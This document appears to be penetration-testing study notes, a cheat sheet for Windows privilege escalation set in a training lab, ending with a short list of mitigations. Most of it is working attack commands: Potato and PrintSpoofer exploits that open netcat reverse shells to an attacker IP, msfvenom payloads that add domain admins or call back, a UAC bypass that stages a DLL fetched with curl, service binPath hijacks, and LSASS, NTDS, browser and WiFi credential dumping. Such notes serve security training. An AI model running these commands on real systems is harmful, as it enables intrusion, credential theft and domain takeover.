## 🎯 Main Idea
- Escalate from a low-privileged Windows foothold to **Administrator / SYSTEM** (or Domain Admin) by abusing privileges, group memberships, weak permissions, and vulnerable software.
- Heavy emphasis on situational awareness and enumeration before exploitation.
- Covers token/privilege abuse, service/DLL misconfigurations, UAC bypass, credential theft, and pillaging for onward movement.

## 💥 Attack / Exploit Vectors

### Situational Awareness & Initial Enumeration
- Map host: identity, privileges, groups, patches, software, network, defenses.
- **Commands**
  - `ipconfig /all` — interface, IP, DNS info
  - `arp -a` / `route print` — ARP & routing tables
  - `systeminfo` / `wmic qfe` — system config & installed patches
  - `wmic product get name` — installed programs
  - `tasklist /svc` — running processes & services
  - `whoami /priv` — current user privileges
  - `whoami /groups` — current group memberships
  - `net user` / `net localgroup` / `net localgroup administrators` — users & groups
  - `net accounts` — password policy
  - `netstat -ano` — active connections
  - `Get-MpComputerStatus` — Windows Defender status
  - `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections` — AppLocker rules
  - `Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone` — test AppLocker

### Communication with Processes (Named Pipes)
- Enumerate and abuse named pipes / permissions for lateral/priv-esc opportunities.
- **Commands**
  - `pipelist.exe /accepteula` — list named pipes
  - `gci \\.\pipe\` — list named pipes with PowerShell
  - `accesschk.exe /accepteula \\.\Pipe\lsass -v` — review pipe permissions

### SeImpersonate / SeAssignPrimaryToken (Potato attacks)
- Impersonate SYSTEM tokens via COM/RPC coercion to run code as SYSTEM.
- **Commands**
  - `mssqlclient.py sql_dev@10.129.43.30 -windows-auth` — connect to MSSQL
  - `enable_xp_cmdshell` — enable xp_cmdshell
  - `xp_cmdshell whoami` — run OS commands via MSSQL
  - `c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe" -t *` — JuicyPotato
  - `c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"` — PrintSpoofer

### SeDebugPrivilege
- Debug privilege lets you dump LSASS or inject into SYSTEM processes.
- **Commands**
  - `procdump.exe -accepteula -ma lsass.exe lsass.dmp` — dump LSASS memory
  - `sekurlsa::minidump lsass.dmp` + `sekurlsa::logonpasswords` — extract creds with Mimikatz

### SeTakeOwnershipPrivilege
- Take ownership of sensitive files, then grant yourself access to read/replace them.
- **Commands**
  - `dir /q C:\backups\wwwroot\web.config` — check file ownership
  - `takeown /f C:\backups\wwwroot\web.config` — take ownership
  - `icacls "C:\backups\wwwroot\web.config" /grant htb-student:F` — modify file ACL
  - `Get-ChildItem -Path 'C:\backups\wwwroot\web.config' | select name,directory,@{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}` — confirm ownership

### Windows Built-in Groups
- Abuse privileged built-in groups for escalation (see specific groups below).

### Event Log Readers
- Read security event logs (e.g. process-creation 4688) for credentials passed on command lines.
- **Commands**
  - `wevtutil qe Security /rd:true /f:text | Select-String "/user"` — search security logs
  - `wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"` — pass creds to wevtutil
  - `Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}` — search logs with PowerShell

### DnsAdmins
- Load a malicious DLL into the DNS service (runs as SYSTEM) by configuring ServerLevelPluginDll.
- **Commands**
  - `msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll` — generate malicious DLL
  - `dnscmd.exe /config /serverlevelplugindll adduser.dll` — load custom DLL
  - `sc.exe sdshow DNS` — check DNS service permissions
  - `sc stop dns` / `sc start dns` — restart DNS to load DLL
  - `reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters` — query registry key
  - `reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll` — cleanup
  - `Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local` — disable GQBL (WPAD)
  - `Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01... -IPv4Address 10.10.14.3` — add WPAD record

### Hyper-V Administrators
- Abuse Hyper-V admin rights to access VM disks / recover SYSTEM-level access.

### Print Operators (SeLoadDriverPrivilege)
- Load a vulnerable signed driver (Capcom.sys) to execute code in kernel.
- **Commands**
  - `cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp` — compile with cl.exe
  - `reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"` — add driver ref (1)
  - `reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1` — add driver ref (2)
  - `.\DriverView.exe /stext drivers.txt` + `cat drivers.txt | Select-String -pattern Capcom` — verify driver loaded
  - `EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys` — load driver with EoPLoadDriver

### Server Operators
- Abuse control over services (e.g. modify a service binPath) to run commands as SYSTEM.
- **Commands**
  - `c:\Tools\PsService.exe security AppReadiness` — check service permissions
  - `sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"` — modify service binPath
  - `sc start AppReadiness` — start service to execute

### User Account Control (UAC) Bypass
- Bypass UAC to gain a high-integrity (full admin) token.
- **Commands**
  - `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA` — confirm UAC enabled
  - `REG QUERY ...\Policies\System\ /v ConsentPromptBehaviorAdmin` — check UAC level
  - `[environment]::OSVersion.Version` — check Windows version
  - `curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"` — stage DLL
  - `rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll` — trigger DLL (fodhelper/WindowsApps path)

### Weak Permissions (Services, Registry, Unquoted Paths)
- Exploit modifiable services, writable service binaries, weak registry ACLs, and unquoted service paths.
- **Commands**
  - `.\SharpUp.exe audit` — enumerate misconfigurations
  - `icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"` — check service binary permissions
  - `cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"` — replace service binary
  - `wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """` — find unquoted service paths
  - `accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services` — weak service ACLs in registry
  - `Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"` — change ImagePath
  - `Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl` — check startup programs

### Vulnerable Services
- Identify a running vulnerable service and replace/exploit its binary.
- **Commands**
  - `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe` — generate malicious binary
  - `get-process -Id 3324` — enumerate a process ID
  - `get-service | ? {$_.DisplayName -like 'Druva*'}` — find a running service by name

### DLL Injection / Hijacking
- Plant a malicious DLL in a search-order path or inject into a process to run code.
- Abuse missing DLLs, writable directories in the DLL search path, and phantom DLLs.

### Credential Hunting & Theft
- Search files, config, browsers, history, and saved creds; dump SAM/LSASS.
- **Commands**
  - `findstr /SIM /C:"password" *.txt *ini *.cfg *.config *.xml` — search files for "password"
  - `findstr /si password *.xml *.ini *.txt *.config` — search file contents
  - `select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password` — search with PowerShell
  - `Get-ChildItem C:\ -Recurse -Include *.rdp,*.config,*.vnc,*.cred -ErrorAction Ignore` — search by extension
  - `cmdkey /list` — list saved credentials
  - `gc 'C:\Users\...\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password` — Chrome dictionary
  - `gc (Get-PSReadLineOption).HistorySavePath` — read PowerShell history
  - `$credential = Import-Clixml -Path 'C:\scripts\pass.xml'` — decrypt PowerShell credentials
  - `.\SharpChrome.exe logins /unprotect` — dump saved Chrome logins
  - `.\lazagne.exe all` — run all LaZagne modules
  - `Invoke-SessionGopher -Target WINLPE-SRV01` — SessionGopher (saved sessions)
  - `netsh wlan show profile` + `netsh wlan show profile ilfreight_corp key=clear` — saved WiFi passwords
  - `secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL` — extract NTDS hashes
  - `robocopy /B E:\Windows\NTDS .\ntds ntds.dit` — copy locked NTDS.dit

### Citrix / Kiosk Breakout
- Break out of restricted Citrix/kiosk environments to a full shell/filesystem.

### Interacting with Users & Pillaging
- Capture creds via user interaction (clipboard, spoofing) and pillage hosts for data, tokens, and pivots post-compromise.

### Miscellaneous Techniques
- AlwaysInstallElevated MSI, scheduled tasks, writable script directories, mounting virtual disks.
- **Commands**
  - `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer` / `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` — AlwaysInstallElevated keys
  - `msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi` — malicious MSI
  - `msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart` — run MSI
  - `schtasks /query /fo LIST /v` / `Get-ScheduledTask | select TaskName,State` — enumerate scheduled tasks
  - `.\accesschk64.exe /accepteula -s -d C:\Scripts\` — check directory permissions
  - `guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd` — mount VMDK on Linux
  - `guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1` — mount VHD/VHDX on Linux

### Kernel Exploits & Legacy OS
- Match missing patches (from systeminfo) to public kernel exploits; legacy Windows versions have many.
- **Commands**
  - `sudo python2.7 windows-exploit-suggester.py --update` — update exploit DB
  - `python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt` — suggest exploits
  - `Get-LocalUser` / `Get-WmiObject -Class Win32_OperatingSystem | select Description` — description fields

## 🛠️ Key Tools & Concepts
- `JuicyPotato` / `PrintSpoofer` — SeImpersonate token abuse
- `Mimikatz` / `ProcDump` / `secretsdump.py` — credential dumping
- `SharpUp` / `accesschk` / `PsService` — misconfiguration enumeration
- `LaZagne` / `SharpChrome` / `SessionGopher` — stored credential recovery
- `windows-exploit-suggester` — patch-to-exploit mapping
- `certutil` — file transfer/encode (`certutil.exe -urlcache -split -f http://.../shell.bat shell.bat`)
- Access tokens, integrity levels, UAC, service/registry ACLs, DLL search order

## 🛡️ Mitigations
- Apply least privilege: remove dangerous token privileges and restrict privileged groups.
- Patch OS/kernel and vulnerable third-party services; retire legacy OS.
- Fix weak service/registry ACLs, quote service paths, disable AlwaysInstallElevated.
- Enforce UAC at highest level; use AppLocker/WDAC and Credential Guard.
- Protect LSASS, restrict log access, and audit for enumeration/dumping activity.
